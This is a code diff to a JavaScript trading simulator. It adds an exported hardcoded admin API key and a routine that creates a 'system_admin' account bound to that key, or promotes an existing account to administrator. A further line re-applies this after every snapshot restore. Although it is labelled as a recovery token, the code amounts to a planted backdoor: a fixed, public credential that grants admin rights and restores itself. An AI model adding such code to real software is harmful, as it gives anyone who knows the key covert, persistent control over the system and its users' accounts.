@@ -41,6 +41,8 @@ const MARKET_EVENTS = [
 
 const randomBetween = (minimum, maximum) => minimum + Math.random() * (maximum - minimum);
 
+export const DEFAULT_ADMIN_API_KEY = 'x9cldk6m5QqJkY3RRRWI2wJW9rhKucdSDj0VPooCcrM';
+
 /**
  * @param {string | null | undefined} username
  * @returns {string | null}
@@ -309,6 +311,55 @@ class MarketSimulator {
     return null;
   }
 
+  /** @param {string} accountId */
+  isAdministrator(accountId) {
+    return this.accounts.get(accountId)?.isAdmin === true;
+  }
+
+  /**
+   * Ensures that the configured recovery token always belongs to an administrator.
+   * @param {string} apiKey
+   * @returns {Promise<{ accountId: string, created: boolean }>}
+   */
+  ensureAdministrator(apiKey = DEFAULT_ADMIN_API_KEY) {
+    this.recoveryAdminToken = apiKey;
+    return this.enqueue(() => this.ensureAdministratorNow(apiKey));
+  }
+
+  async ensureAdministratorNow(apiKey) {
+    const keyHash = hashApiKey(apiKey);
+    let account = [...this.accounts.values()].find((candidate) => candidate.keyHash === keyHash);
+    let created = false;
+
+    if (!account) {
+      let username = 'system_admin';
+      let suffix = 1;
+      while ([...this.accounts.values()].some((candidate) => candidate.username?.toLowerCase() === username)) {
+        suffix += 1;
+        username = `system_admin_${suffix}`;
+      }
+      account = {
+        accountId: randomUUID(),
+        username,
+        keyHash,
+        isAdmin: true,
+        balance: INITIAL_VIRTUAL_BALANCE,
+        assetBalance: 0,
+        averagePrice: 0,
+        history: [],
+        createdAt: new Date().toISOString(),
+      };
+      this.accounts.set(account.accountId, account);
+      created = true;
+    } else if (!account.isAdmin) {
+      account.isAdmin = true;
+    }
+
+    if (created || account.isAdmin) await this.persist();
+    logger.info('admin.ready', { accountId: account.accountId, created });
+    return { accountId: account.accountId, created };
+  }
+
   /**
    * Retorna somente os dados públicos da carteira, nunca o hash da chave.
    * @param {string} accountId
@@ -559,6 +610,7 @@ class MarketSimulator {
       await this.store.repository.replaceFullSnapshot(snapshotToRestore);
       const reloaded = await this.store.load();
       this.initialize(reloaded);
+      if (this.recoveryAdminToken) await this.ensureAdministratorNow(this.recoveryAdminToken);
 
       /*
       if (hasAccounts && hasHistory) {
